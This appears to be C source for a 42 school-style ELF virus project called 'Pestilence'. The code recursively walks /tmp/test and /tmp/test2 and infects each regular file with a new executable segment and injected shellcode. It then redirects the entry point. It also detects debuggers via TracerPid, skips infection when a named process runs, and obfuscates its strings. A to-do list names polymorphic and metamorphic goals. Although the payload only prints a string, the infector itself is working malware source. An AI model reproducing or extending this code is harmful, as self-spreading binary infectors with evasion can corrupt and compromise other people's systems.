/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

/*
	PESTILENCE
	[X] Creer segment pour injecter d'une taille arbitraire
	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
		[X] /tmp/test et /tmp/test2
		[X] infection binaire 64 bits
		[ ] pas de double infection
		[X] pas de sortie std ou erreur
	[X] Avoid infection if debugger
	[X] Avoid infection if specific program running
	[ ] Code source illisible et offuscé

	WAR
	[ ] Fingerprint unique dans signature pour chaque infection
		- how ?

	DEATH
	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
   original identique
		- how ?
*/

#include "pestilence.h"
#ifndef BEGIN
#define BEGIN 0
#endif
#ifndef END
#define END 0
#endif
#ifndef PROUT
#define PROUT 0
#endif
void _start(void)
{
	void *begin_ptr;

	if (is_debugged() || is_program_running("doom-nukem"))
		proc_terminate(0);

	__asm__ volatile("lea (%%rip), %0\n"
					 "prout:"
					 : "=r"(begin_ptr));
	begin_ptr += BEGIN - PROUT;

	fs_release(1);
	fs_release(2);

	char path[11];
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	processDirectory(path, begin_ptr);
	path[9] = '2';
	processDirectory(path, begin_ptr);
	proc_terminate(0);
}

static unsigned char ror4(unsigned char x)
{
	return (unsigned char) ((x >> 4) | (x << 4));
}

static void decode(char *out, const unsigned char *in)
{
	unsigned i = 0;
	while (in[i])
	{
		out[i] = (char) ((ror4(in[i]) ^ (i * 7)) - 0x3D);
		i++;
	}
	out[i] = 0;
}

// "/proc"
static const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
// "/comm"
static const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};

int is_program_running(const char *target)
{
	int	 fd = -1;
	int	 ret = 0;

	char proc_path[16];
	decode(proc_path, S_PROC);

	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;

	char buf[4096];

	for (;;)
	{
		int nread = fs_enumerate(fd, buf, sizeof(buf));
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (void *) (buf + bpos);
			char				  *name = d->d_name;

			int					   numeric = 1;
			for (int i = 0; name[i]; i++)
				numeric &= ((unsigned) (name[i] - '0') < 10);
			if (numeric)
			{
				char path[64];
				int	 i = 0;

				decode(path, S_PROC);
				while (path[i])
					i++;

				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];

				char comm[8];
				decode(comm, S_COMM);

				for (int j = 0; comm[j]; j++)
					path[i++] = comm[j];

				path[i] = 0;

				int cfd = fs_handle(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
					fs_release(cfd);

					if (len > 0)
					{
						pname[len] = 0;
						for (int j = 0; j < len; j++)
							if (pname[j] == '\n')
							{
								pname[j] = 0;
								break;
							}

						if (!delay_abs_calc(pname, target))
						{
							ret = 1;
							goto DONE;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}

DONE:
	fs_release(fd);
	return ret;
}

int is_debugged(void)
{
	int f = fs_handle("/proc/self/status", O_RDONLY);
	if (f < 0)
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline = memoff(line, '\n');
		if (newline)
		{
			*newline = '\0';
			if (delay_calc(line, "TracerPid:", 10) == 0)
			{
				int pid = trace_depth(line + 10);
				fs_release(f);
				return pid != 0;
			}
			offset = 0;
		}
	}

	fs_release(f);
	return 0;
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = fs_handle(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	if (fd < 0)
		goto clean;
	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			dot[0] = '.';
			dot[1] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);

			struct stat statbuf;
			fs_query(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	fs_release(fd);
}

#define ELF_MAGIC			   0x464c457f
#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
#define inout
#define CURARE                                                                 \
	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
	"\xe9\xe9\xff\xff\xff\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35" \
	"\x13\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00" \
	"\x00\x00\x00\x0f\x05\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
#define FLOWER (sizeof(CURARE) - 1)
#define ACONIT 19

int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
			   inout char **file_data)
{
	int fd;

	*file_data = NULL;
	fd = fs_handle(path, O_RDWR);
	if (fd < 0 || io_query(fd, statbuf) < 0)
		goto error;
	if (io_resize(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
		goto error;
	*file_data
		= (void *) rt_vector(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
							 PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize)
		goto error;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	return (OK);
error:
	fs_release(fd);
	vm_release(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
	return (KO);
}

unsigned long find_first_free_page(t_elf elf)
{
	unsigned long ret;

	ret = 0;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_LOAD
			&& ret < elf.segments[i].p_memsz + elf.segments[i].p_vaddr)
			ret = elf.segments[i].p_memsz + elf.segments[i].p_vaddr;
	ret = (ret + 0x1000 - 1) & ~0xfffUL; // align to next page
	return ret;
}

void infect(char *path, void *begin_ptr)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int last_pt_load;

	if (parse_file(path, &statbuf, &elf, &file_data))
		goto clean;

	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
	unsigned long pestis = find_first_free_page(elf);
	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
		   elf.header->e_phnum * elf.header->e_phentsize);
	elf.header->e_phoff = append_pos;
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
		.p_type = PT_LOAD,
		.p_align = 0x1000,
		.p_filesz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
		.p_memsz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
		.p_offset = append_pos,
		.p_paddr = pestis,
		.p_vaddr = pestis,
		.p_flags = PF_X | PF_R,
	};
	elf.header->e_phnum++;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_PHDR)
		{
			elf.segments[i].p_offset = append_pos;
			elf.segments[i].p_vaddr = pestis;
			elf.segments[i].p_paddr = pestis;
			elf.segments[i].p_memsz
				= elf.header->e_phnum * elf.header->e_phentsize;
			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
		}
	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
	memcpy(file_data + append_pos, CURARE, FLOWER);
	unsigned delta = elf.header->e_entry;
	elf.header->e_entry
		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
	delta -= elf.header->e_entry + ACONIT + 4;
	memcpy(file_data + append_pos + ACONIT, &delta, 4);
clean:
	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
}
